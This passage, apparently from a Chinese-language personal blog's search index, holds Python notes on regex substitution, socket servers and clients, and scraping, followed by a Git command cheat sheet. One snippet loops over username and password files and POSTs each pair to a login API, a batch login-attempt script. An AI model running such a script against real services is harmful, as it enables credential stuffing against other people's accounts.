class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(\w+) (\w+)&#x27;</span>)</span><br><span class="line">s = <span class="string">&#x27;i say, hello world!&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> re.sub(pattern,<span class="string">r&#x27;\2 \1&#x27;</span>, s)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">return</span> m.group(<span class="number">1</span>).title() + <span class="string">&#x27; &#x27;</span> + m.group(<span class="number">2</span>).title()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> re.sub(pattern,func, s)</span><br><span class="line"> </span><br><span class="line"><span class="comment">### output ###</span></span><br><span class="line"><span class="comment"># say i, world hello!</span></span><br><span class="line"><span class="comment"># I Say, Hello World!</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>（7）re.subn(pattern, repl, string[, count])</strong></p><p>返回 (sub(repl, string[, count]), 替换次数)。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;(\w+) (\w+)&#x27;</span>)</span><br><span class="line">s = <span class="string">&#x27;i say, hello world!&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> re.subn(pattern,<span class="string">r&#x27;\2 \1&#x27;</span>, s)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">return</span> m.group(<span class="number">1</span>).title() + <span class="string">&#x27; &#x27;</span> + m.group(<span class="number">2</span>).title()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> re.subn(pattern,func, s)</span><br><span class="line"> </span><br><span class="line"><span class="comment">### output ###</span></span><br><span class="line"><span class="comment"># (&#x27;say i, world hello!&#x27;, 2)</span></span><br><span class="line"><span class="comment"># (&#x27;I Say, Hello World!&#x27;, 2)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h2><h3 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h3><p><strong>服务端</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">server.bind((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8000</span>))</span><br><span class="line">server.listen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_sock</span>(<span class="params">sock, addr</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="built_in">print</span>(data.decode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">        re_data = <span class="built_in">input</span>()</span><br><span class="line">        sock.send(re_data.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">sock, addr = server.accept()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;用线程去处理新接收的连接（用户）&#x27;&#x27;&#x27;</span></span><br><span class="line">client_thread = threading.Thread(target=handle_sock, args=(sock, addr))<span class="comment">#传的一定是函数名称</span></span><br><span class="line">client_thread.start()</span><br></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">client.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8000</span>))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    re_data = <span class="built_in">input</span>()</span><br><span class="line">    client.send(re_data.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    data = client.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(data.decode(<span class="string">&quot;utf8&quot;</span>))</span><br></pre></td></tr></table></figure><h3 id="实用示例"><a href="#实用示例" class="headerlink" title="实用示例"></a>实用示例</h3><p><strong>服务端</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   SERVER</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.1.88&#x27;</span></span><br><span class="line">PORT = <span class="number">55555</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#只接收这么多个bytes</span></span><br><span class="line">BUFFERSIZE = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># socket实例，UDP连接 </span></span><br><span class="line">s = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line"><span class="comment"># 重用ip和端口</span></span><br><span class="line">s.setsockopt(SOL_SOCKET, SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line"><span class="comment"># s绑定主机地址和端口</span></span><br><span class="line">s.bind((HOST, PORT))</span><br><span class="line"><span class="comment"># 监听队列</span></span><br><span class="line"><span class="comment">#s.listen()</span></span><br><span class="line"><span class="comment"># 服务器对话日志</span></span><br><span class="line">logfile = <span class="string">&#x27;dialog.log&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    <span class="comment"># <span class="doctag">TODO:</span> 这里格式还是不好，应该支持带格式的字符串</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;SERVER: &quot;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clean_up</span>():</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(logfile):</span><br><span class="line">        os.remove(logfile)</span><br><span class="line"></span><br><span class="line">clean_up()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 简单地监听客户端的消息，收到消息后回复确认</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=== THE SERVER START WORKING ===&quot;</span>)</span><br><span class="line">   <span class="comment"># 此处的s.recvfrom方法和s.recv都会返回接收到的数据，而recvfrom还会返回客户端的地址</span></span><br><span class="line">    data, addr = s.recvfrom(BUFFERSIZE)</span><br><span class="line">    data = data.decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    server_print(<span class="string">&quot;recived message from client(%s): %s&quot;</span> % (addr, data))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(logfile, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        log = <span class="string">&quot;client&#123;0&#125; \t message: &#123;1&#125;\n&quot;</span>.<span class="built_in">format</span>(addr, data)</span><br><span class="line">        f.write(log)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># 回复消息</span></span><br><span class="line">    s.sendto(<span class="string">&quot;SERVER ROGER THAT &quot;</span>.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>), addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> s._closed():</span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> </span></span><br><span class="line"><span class="comment"># 不知道怎么退出服务端好 ...</span></span><br><span class="line"><span class="comment"># 如果通过客户端输入`exit`来退出，则会导致客户端英文和服务端断开连接而异常退出</span></span><br><span class="line"><span class="comment"># 然后如果在服务端加入input和用户交互，则会导致客户端和服务端必须依次轮流发送信息 ...</span></span><br></pre></td></tr></table></figure><p><strong>客户端</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#   encoding:utf-8</span></span><br><span class="line"><span class="comment">#   CLIENT</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.1.88&#x27;</span></span><br><span class="line">PORT = <span class="number">55555</span></span><br><span class="line">addr = (HOST, PORT)</span><br><span class="line"></span><br><span class="line"><span class="comment">#一次接收这么多bytes</span></span><br><span class="line">BUFFERSIZE = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SOCK_DGRAM ：UDP连接</span></span><br><span class="line">s = socket(AF_INET, SOCK_DGRAM)</span><br><span class="line"><span class="comment"># socket类s去连接服务器</span></span><br><span class="line">s.connect((HOST, PORT))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">client_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;CLIENT: &quot;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    kel = <span class="built_in">input</span>(<span class="string">&#x27;Question &gt;&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> kel == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    client_print(<span class="string">&#x27;input data: %s&#x27;</span> % kel)</span><br><span class="line">    <span class="comment"># python3 socket 只能收发二进制数据，需要转码</span></span><br><span class="line">    kel = kel.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="comment">#s.sendall(kel)</span></span><br><span class="line">    <span class="comment"># 发送数据</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.sendto(kel, addr)</span><br><span class="line">        <span class="comment"># 接收数据</span></span><br><span class="line">        data, addr = s.recvfrom(BUFFERSIZE)</span><br><span class="line">        client_print(<span class="string">&quot;recived message from server(&#123;0&#125;:&#123;1&#125;) : &#123;2&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>], addr[<span class="number">1</span>], data.decode(<span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    <span class="keyword">except</span> ConnectionRefusedError:</span><br><span class="line">        client_print(<span class="string">&quot;exit client&quot;</span>)</span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> s._closed:</span><br><span class="line">    s.close()</span><br><span class="line"></span><br><span class="line">sys.exit()</span><br></pre></td></tr></table></figure><h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><h3 id="Json"><a href="#Json" class="headerlink" title="Json"></a>Json</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;url&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.28 Safari/537.36 OPR/61.0.3298.6 (Edition developer)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;application/json, text/plain, */*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json;charset=utf-8&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">usr_list=[]</span><br><span class="line">psw_list=[]</span><br><span class="line">url=<span class="string">&#x27;api/url&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">username,passwad</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: passwad</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> json.dumps(data)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;usr.txt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> usr <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> usr!=<span class="literal">None</span>:</span><br><span class="line">            usr_list.append(usr.strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(usr_list)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;psw.txt&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> psw <span class="keyword">in</span> f.readlines():</span><br><span class="line">        <span class="keyword">if</span> psw!=<span class="literal">None</span>:</span><br><span class="line">            psw_list.append(psw.strip(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(psw_list)</span><br><span class="line"><span class="keyword">for</span> usname,pswa <span class="keyword">in</span> <span class="built_in">zip</span>(usr_list,psw_list):</span><br><span class="line">    <span class="built_in">print</span>(usname)</span><br><span class="line">    <span class="built_in">print</span>(pswa)</span><br><span class="line">    res=requests.post(url,headers=headers,data=get_data(username=usname,passwad=pswa))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="待补充"><a href="#待补充" class="headerlink" title="待补充"></a>待补充</h2><h3 id="正则匹配简单的爬取模板"><a href="#正则匹配简单的爬取模板" class="headerlink" title="正则匹配简单的爬取模板"></a>正则匹配简单的爬取模板</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://xxxx&quot;</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11&quot;</span>&#125;</span><br><span class="line">res = requests.get(url=url, headers=header)</span><br><span class="line">pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;a href=&quot;(.*?)/&quot; target=&quot;_blank&quot;&gt;&#x27;</span>) <span class="comment">#匹配样例规则</span></span><br><span class="line">domain = pattern.findall(<span class="built_in">str</span>(res.text))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> domain:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commonly Used Git Commands</title>
      <link href="/2020/08/07/Common-Git-Commands/"/>
      <url>/2020/08/07/Common-Git-Commands/</url>
      
        <content type="html"><![CDATA[<h2 id="ssh密钥设置"><a href="#ssh密钥设置" class="headerlink" title="ssh密钥设置"></a>ssh密钥设置</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//设置Git的user name和email</span></span><br><span class="line">git config --<span class="keyword">global</span> user.name <span class="string">&quot;L0kiii&quot;</span></span><br><span class="line"></span><br><span class="line">git config --<span class="keyword">global</span> user.email  <span class="string">&quot;111111@qq.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//检查是否已经有SSH Key</span></span><br><span class="line">cd ~/.ssh</span><br><span class="line">  </span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成密钥</span></span><br><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;11111@qq.com&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加密钥到ssh-agent</span></span><br><span class="line">eval <span class="string">&quot;$(ssh-agent -s)&quot;</span></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">ssh-<span class="keyword">add</span> ~/.ssh/id_rsa</span><br><span class="line">  </span><br><span class="line"><span class="comment">//登录github add an SSH Key复制粘贴步骤不再叙述</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line">ssh -T git@github.com</span><br><span class="line"><span class="comment">//成功回显</span></span><br><span class="line">Hi L0kiii! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure><h2 id="项目部署"><a href="#项目部署" class="headerlink" title="项目部署"></a>项目部署</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">git <span class="keyword">init</span></span><br><span class="line">  </span><br><span class="line">git remote <span class="keyword">add</span> origin git@github.com:L0kiii/xxxx.git</span><br><span class="line"></span><br><span class="line">git pull origin master –allow-unrelated-histories</span><br><span class="line"></span><br><span class="line">git <span class="keyword">add</span> &lt;file&gt;/ git <span class="keyword">add</span> &lt;dir&gt;/git <span class="keyword">add</span> .<span class="comment">//多个用空格隔开</span></span><br><span class="line">  </span><br><span class="line">git commit -m <span class="string">&quot;first commit&quot;</span></span><br><span class="line"> </span><br><span class="line">git push -u origin master/git push -u origin master -f</span><br></pre></td></tr></table></figure><h2 id="提交文件到索引库"><a href="#提交文件到索引库" class="headerlink" title="提交文件到索引库"></a>提交文件到索引库</h2><p>“索引”保存工作树内容的快照，并且将该快照作为下一个提交的内容。 因此，在对工作树进行任何更改之后，并且在运行 <code>git commit</code>命令之前，必须使用 <code>git add</code>命令将任何新的或修改的文件添加到索引。</p><p>新建test.txt文件<br>提交test.txt文件到索引库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add test.txt</span><br></pre></td></tr></table></figure><p>查看目录中所有修改过或已删件但没有提交的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git add -i [&lt;path&gt;]</span><br></pre></td></tr></table></figure><h2 id="提交索引文件到仓库"><a href="#提交索引文件到仓库" class="headerlink" title="提交索引文件到仓库"></a>提交索引文件到仓库</h2><p>-m参数是本次修改的描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git commit -m &quot;add a test.txt file&quot;</span><br></pre></td></tr></table></figure><h2 id="关联远程仓库"><a href="#关联远程仓库" class="headerlink" title="关联远程仓库"></a>关联远程仓库</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git remote add origin git@github.com:Github用户名/GitTest.git</span><br></pre></td></tr></table></figure><h2 id="把本地库的所有内容推送到远程库上"><a href="#把本地库的所有内容推送到远程库上" class="headerlink" title="把本地库的所有内容推送到远程库上"></a>把本地库的所有内容推送到远程库上</h2><p>由于远程库是空的，我们第一次推送master分支时，加上了-u参数，Git不但会把本地的master分支内容推送的远程新的master分支，还会把本地的master分支和远程的master分支关联起来，在以后的推送或者拉取时就可以简化命令，不加任何参数使用 <code>git push</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push -u origin master </span><br></pre></td></tr></table></figure><h2 id="显示工作目录和暂存区的状态"><a href="#显示工作目录和暂存区的状态" class="headerlink" title="显示工作目录和暂存区的状态"></a>显示工作目录和暂存区的状态</h2><p><code>git status</code>命令可以列出当前目录所有还没有被git管理的文件和被git管理且被修改但还未提交(<code>git commit</code>)的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git status</span><br></pre></td></tr></table></figure><h2 id="git-diff-文件对比"><a href="#git-diff-文件对比" class="headerlink" title="git diff 文件对比"></a>git diff 文件对比</h2><p>假设仓库里已提交的有五个版本，依次提交的是A、B、C、D、E 。<br>不加参数即默认比较工作区与暂存区</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure><p>查看最近两次提交版本的区别（版本E和版本D的差别）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff HEAD^ -- &lt;filename&gt; </span><br></pre></td></tr></table></figure><p>命令则可以查看最近一次提交和最近一次提交的上上个版本的区别（版本E和版本C的差别）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff HEAD^^ -- &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>查看版本E和版本A的差别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git diff HEAD~4 -- &lt;filename&gt; </span><br></pre></td></tr></table></figure><h2 id="查看版本历史记录"><a href="#查看版本历史记录" class="headerlink" title="查看版本历史记录"></a>查看版本历史记录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git log</span><br><span class="line"></span><br><span class="line">git log --pretty=oneline</span><br></pre></td></tr></table></figure><h2 id="版本回退"><a href="#版本回退" class="headerlink" title="版本回退"></a>版本回退</h2><p>回退到上一个版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard HEAD^</span><br><span class="line"></span><br><span class="line">git reset --hard [commit id]</span><br></pre></td></tr></table></figure><p><code>HEAD</code>指向的版本就是当前版本</p><h2 id="查看git历史命令"><a href="#查看git历史命令" class="headerlink" title="查看git历史命令"></a>查看git历史命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reflog</span><br></pre></td></tr></table></figure><h2 id="撤销工作区的修改"><a href="#撤销工作区的修改" class="headerlink" title="撤销工作区的修改"></a>撤销工作区的修改</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD &lt;filename&gt;</span><br></pre></td></tr></table></figure><p>下面的命令还可以撤销工作区中删除的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -- &lt;filename&gt;</span><br></pre></td></tr></table></figure><h2 id="从版本库中删除文件"><a href="#从版本库中删除文件" class="headerlink" title="从版本库中删除文件"></a>从版本库中删除文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm &lt;filename&gt;</span><br></pre></td></tr></table></figure><h2 id="工作区和暂存区"><a href="#工作区和暂存区" class="headerlink" title="工作区和暂存区"></a>工作区和暂存区</h2><h3 id="工作区"><a href="#工作区" class="headerlink" title="工作区"></a>工作区</h3><p>工作区就是在电脑里所看到的目录。</p><h3 id="版本库"><a href="#版本库" class="headerlink" title="版本库"></a>版本库</h3><p>工作区中的 